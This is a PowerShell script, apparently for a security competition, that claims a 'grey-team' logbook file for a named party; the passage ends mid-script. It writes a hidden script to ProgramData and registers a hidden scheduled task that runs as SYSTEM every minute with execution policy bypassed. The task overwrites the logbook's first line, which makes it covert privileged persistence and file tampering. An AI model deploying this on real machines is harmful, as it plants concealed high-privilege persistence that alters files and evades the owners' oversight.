# Customize these variables:
$party = "The Delta Knights"                # Name of the party to be logged
$logbookPath = "C:\Windows\System32\grey-team\logbook.txt"  # Corrected path
$updateScriptPath = "$env:ProgramData\.update_logbook.ps1"  # Path for the hidden update script
$taskName = "LogbookUpdateTask"        # Task name for the scheduled task

# First, check if the logbook file exists
if (-not (Test-Path $logbookPath)) {
    Write-Host "Error: Logbook file does not exist at $logbookPath"
    exit
}

# Step 1: Create the hidden update script that changes the first line of the logbook
$updateScriptContent = @"
# PowerShell script to update the logbook with the party's name.
`$party = '$party'
`$logbookPath = '$logbookPath'

# Check if the logbook exists
if (-not (Test-Path `$logbookPath)) {
    Write-Host "Error: Logbook file not found"
    exit
}

try {
    # Read the logbook and modify the first line
    `$content = Get-Content -Path `$logbookPath -ErrorAction Stop
    if (`$content.Count -eq 0) {
        Set-Content -Path `$logbookPath -Value `$party -ErrorAction Stop
    } else {
        `$content[0] = `$party
        Set-Content -Path `$logbookPath -Value `$content -ErrorAction Stop
    }
} catch {
    Write-Host "Error: Unable to modify logbook - `$_"
    exit
}
"@

try {
    # Create the update script as a hidden file
    $updateScriptContent | Out-File -FilePath $updateScriptPath -Force -ErrorAction Stop

    # Make the update script hidden
    $file = Get-Item $updateScriptPath
    $file.Attributes = [System.IO.FileAttributes]::Hidden
    
    Write-Host "Hidden update script has been created."

    # Create a scheduled task to run the update script every minute
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$updateScriptPath`""
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $trigger.RepetitionInterval = New-TimeSpan -Minutes 1
    $trigger.RepetitionDuration = New-TimeSpan -Days 1

    $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteriesLow $true -DontStopIfGoingOnBatteries $true -Hidden $true
    $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

    Register-ScheduledTask -Action $action -Principal $taskPrincipal -Trigger $trigger -Settings $taskSettings -TaskName $taskName -Force -ErrorAction Stop
    Write-Host "Secret scheduled task to update logbook has been created."
} catch {
    Write-Host "Error: Failed to create scheduled task or update script - $_"
    # Clean up the update script if it was created
    if (Test-Path $updateScriptPath) {
        Remove-Item $updateScriptPath -Force
    }
    exit
